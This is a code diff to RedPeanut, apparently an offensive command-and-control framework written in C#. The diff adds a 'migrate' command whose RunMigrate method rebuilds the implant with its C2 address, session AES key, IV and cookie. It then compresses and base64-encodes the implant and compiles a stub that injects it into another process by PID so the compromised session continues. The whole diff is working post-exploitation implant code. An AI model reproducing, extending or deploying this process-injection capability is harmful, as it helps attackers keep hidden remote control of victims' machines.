@@ -9,6 +9,8 @@ using System.Collections.Generic;
 using static RedPeanut.Utility;
 using System.IO;
 using static RedPeanut.Models;
+using Newtonsoft.Json;
+using System.Text;
 
 namespace RedPeanut
 {
@@ -22,6 +24,7 @@ namespace RedPeanut
             { "killagent", "Kill current agent" },
             { "managed", "Agent will run task in managed mode" },
             { "unmanaged", "Agent will run task in unmanaged mode" },
+            { "migrate", "Migrate to another process" },
             { "reverttoself", "Revert all token" }
         };
 
@@ -51,8 +54,9 @@ namespace RedPeanut
             return StandardMenu(input);
         }
 
-        private bool StandardMenu(string input)
+        private bool StandardMenu(string inputcmd)
         {
+            string input = inputcmd.Split(" ")[0];
             string f_input = ParseSelection(input);
 
             if (!string.IsNullOrEmpty(input))
@@ -81,6 +85,9 @@ namespace RedPeanut
                             return true;
                         case "unmanaged":
                             RunSetUnManaged();
+                            return true;
+                        case "migrate":
+                            RunMigrate(GetParsedSetInt("set " + inputcmd));
                             return true;
                         default:
                             return false;
@@ -174,6 +181,63 @@ namespace RedPeanut
             msg.InjectionManagedTask = injectionManagedTask;
 
             agent.SendCommand(msg);
+        }
+
+        private void RunMigrate(int pid)
+        {
+            string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
+            //Create RedPeanutAgent assembly
+            string source = File.ReadAllText(Path.Combine(folderrpath, AGENT_TEMPLATE));
+
+            ListenerConfig conf = new ListenerConfig("", ((AgentInstanceHttp)agent).GetAddress(), ((AgentInstanceHttp)agent).GetPort(), RedPeanutC2.server.GetProfile(((AgentInstanceHttp)agent).GetProfileid()) , ((AgentInstanceHttp)agent).GetProfileid());
+            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(), ((AgentInstanceHttp)agent).TargetFramework, conf);
+            string b64CompressedAgent = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, agent.AgentId + ".dll", ((AgentInstanceHttp)agent).TargetFramework, compprofile: CompilationProfile.Agent)));
+            string instanceid = RandomAString(10, new Random());
+
+            //Create AgentState
+            AgentState astate = new AgentState
+            {
+                Agentid = agent.AgentId,
+                sessionkey = agent.AesManager.Key,
+                sessioniv = agent.AesManager.IV,
+                cookie = ((AgentInstanceHttp)agent).Cookie,
+                RequestInstanceid = instanceid
+            };
+            if (agent.Pivoter != null)
+                astate.pipename = agent.Pivoter.AgentId;
+
+            string b64State = Convert.ToBase64String(Encoding.Default.GetBytes(JsonConvert.SerializeObject(astate, Formatting.Indented)));
+
+            ModuleConfig modconfig = new ModuleConfig
+            {
+                Assembly = b64CompressedAgent,
+                Method = "LoadAndRun",
+                Moduleclass = "RedPeanutAgent.Worker",
+                Parameters = new string[] { b64State }
+            };
+
+            TaskMsg task = new TaskMsg
+            {
+                TaskType = "module",
+                ModuleTask = modconfig,
+                Agentid = agent.AgentId
+            };
+
+            if (agent.Pivoter != null)
+                task.AgentPivot = agent.Pivoter.AgentId;
+
+
+            //Read template
+            source = File.ReadAllText(Path.Combine(folderrpath, MIGRATE_TEMPLATE));
+            //Replace
+            source = Replacer.ReplaceMigrate(source, Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(task)))), pid);
+            //Run
+            string migrate = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll", ((AgentInstanceHttp)agent).TargetFramework, compprofile: CompilationProfile.Migrate)));
+            RunAssemblyBase64(
+                migrate,
+                "RedPeanutMigrate",
+                new string[] { " " },
+                agent, tasktype: "migrate",instanceid: instanceid);
         }
     }
 }
